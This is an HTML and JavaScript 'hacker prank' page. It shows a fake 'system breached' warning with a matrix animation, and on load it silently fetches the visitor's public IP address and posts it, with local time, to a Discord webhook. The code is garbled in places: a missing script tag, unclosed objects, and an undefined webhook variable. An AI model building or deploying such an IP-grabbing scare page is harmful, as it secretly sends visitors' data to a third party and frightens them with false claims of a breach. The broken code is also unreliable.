<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ CRITICAL WARNING ⚠️</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: relative;
            user-select: none;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0.25;
        }
        .ui-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            text-align: center;
            width: 90%;
            max-width: 650px;
            background: rgba(10, 0, 0, 0.85);
            padding: 40px;
            border: 3px solid #ff0000;
            border-radius: 5px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
            animation: glitch-border 1.5s infinite;
        }
        h1 {
            font-size: 38px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ff0000;
            animation: blink 0.8s infinite;
        }
        .warning-text {
            font-size: 22px;
            line-height: 1.6;
            margin-bottom: 25px;
            color: #ffffff;
            text-shadow: 0 0 5px #ff0000;
        }
        .ip-display {
            font-size: 28px;
            background: #150000;
            padding: 15px;
            border: 1px dashed #ff0000;
            display: inline-block;
            margin-bottom: 25px;
            letter-spacing: 1px;
            box-shadow: inset 0 0 10px rgba(255,0,0,0.5);
        }
        .status-msg {
            font-size: 14px;
            color: #888;
            margin-top: 15px;
        }
        .eyes-box {
            display: flex;
            justify-content: center;
            gap: 40px;
            margin-bottom: 25px;
        }
        .eye {
            width: 70px;
            height: 70px;
            background: #fff;
            border-radius: 50%;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 15px #ff0000;
            border: 2px solid #ff0000;
        }
        .pupil {
            width: 25px;
            height: 25px;
            background: #ff0000;
            border-radius: 50%;
            position: absolute;
            box-shadow: 0 0 8px #000;
        }
        @keyframes blink {
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0.4; }
        }
        @keyframes glitch-border {
            0%, 100% { border-color: #ff0000; box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); }
            50% { border-color: #aa0000; box-shadow: 0 0 15px rgba(170, 0, 0, 0.3); }
        }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>

<div class="ui-container">

    <div class="eyes-box">
        <div class="eye"><div class="pupil"></div></div>
        <div class="eye"><div class="pupil"></div></div>
    </div>

    <div class="warning-text">
        WARNING! WARNING! WARNING!<br>
        Your system has been successfully breached.<br>
        We have established a remote connection and extracted your IP!

    <div class="ip-display" id="ipAddress">EXTRACTING DATA...</div>
    
    <div class="status-msg" id="statusMessage">Uploading payload to central server...</div>

    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    const chars = "01";
    const fontSize = 16;
    const columns = Math.floor(canvas.width / fontSize);
    const drops = Array(columns).fill(1);

    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#ff0000';
        ctx.font = fontSize + 'px monospace';
        
        for (let i = 0; i < drops.length; i++) {
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 33);

    const pupils = document.querySelectorAll('.pupil');
    document.addEventListener('mousemove', (e) => {
        pupils.forEach(pupil => {
            const eye = pupil.parentElement;
            const rect = eye.getBoundingClientRect();
            const eyeX = rect.left + rect.width / 2;
            const eyeY = rect.top + rect.height / 2;
            
            const angle = Math.atan2(e.clientY - eyeY, e.clientX - eyeX);
            const maxDistance = 18;
            
            const pupilX = Math.cos(angle) * maxDistance;
            const pupilY = Math.sin(angle) * maxDistance;
            
            pupil.style.transform = `translate(${pupilX}px, ${pupilY}px)`;
        });
    });

    async function startHackerPrank() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const currentIp = ipData.ip;

            document.getElementById('ipAddress').textContent = currentIp;
            document.getElementById('statusMessage').textContent = "Data transfer complete. IP connection locked.";

            const discordPayload = {
                username: "😈 Cyber Prank Bot 😈",
                embeds: [{
                    title: "🎯 Prank Successful! Target IP Captured",
                    color: 16711680,
                    fields: [
                        {
                            name: "👤 Captured IP Address:",
                            value: `\`\`\`${currentIp}\`\`\``,
                            inline: false
                        },
                        {
                            name: "⏰ Local Time:",

                    ],
                    footer: {
                        text: "Automated IP Grabber Prank"

                }]
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

        } catch (error) {
            document.getElementById('ipAddress').textContent = "127.0.0.1 (Error)";
            document.getElementById('statusMessage').textContent = "Failed to sync with central database.";
            console.error(error);
        }
    }

    window.onload = startHackerPrank;
</script>

</body>
</html>
